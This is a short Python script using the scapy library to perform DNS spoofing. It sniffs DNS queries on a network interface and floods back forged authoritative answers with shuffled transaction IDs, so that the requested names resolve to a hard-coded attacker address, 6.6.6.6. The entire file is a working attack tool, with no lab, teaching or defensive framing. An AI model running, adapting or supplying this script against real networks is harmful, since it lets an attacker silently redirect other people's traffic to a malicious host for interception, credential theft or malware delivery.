from concurrent.futures import ThreadPoolExecutor
import random

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.packet import Packet
from scapy.sendrecv import send, sniff

ATTACK_IP = "6.6.6.6"


def get_ip_version(packet: Packet):
    if packet.haslayer(IP):
        return IP

    elif packet.haslayer(IPv6):
        return IPv6


NUMBER_OF_POSSIBLE_ID = 65536
# The number of tries to have a 50% chance of success
NUMBER_OF_TRIES = 302

tx_ids = list(range(NUMBER_OF_POSSIBLE_ID))

# Thread pool to manage DNS poisoning tasks
MAX_WORKERS = 300
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)


def create_dns_layer(tx_id: list[int], packet: Packet):
    """
    Sends a spoofed DNS response for a given transaction ID.
    """
    return DNS(
        id=tx_id,
        qr=1,  # Response
        aa=1,  # Authoritative Answer
        qd=packet[DNS].qd,
        an=DNSRR(
            rrname=packet[DNS].qd.qname,
            type="A",
            rclass="IN",
            ttl=300,
            rdata=ATTACK_IP,
        ),
    )


def send_spoofed_responses(packet: Packet):
    """
    Sends multiple spoofed DNS responses for a single intercepted packet.
    """
    try:
        responses: list[Packet] = []
        first_layers = IP(dst=packet[IP].src, src=packet[IP].dst) / UDP(
            dport=packet[UDP].sport, sport=53
        )

        random.shuffle(tx_ids)

        dns_layer = create_dns_layer(tx_ids, packet)
        response = first_layers / dns_layer
        responses.append(response)

        # Send all responses
        send(response, verbose=0)
    except Exception as e:
        print(f"Error handling packet: {e}")


def dns_poisoning(packet: Packet):
    if packet.haslayer(DNS) and packet[DNS].opcode == 0 and packet[DNS].qr == 0:
        executor.submit(send_spoofed_responses, packet)


filter_string = "udp port 53"

try:
    sniff(prn=dns_poisoning, filter=filter_string, iface="eth1")
except KeyboardInterrupt:
    print("Stopping DNS poisoning...")
finally:
    executor.shutdown(wait=True)
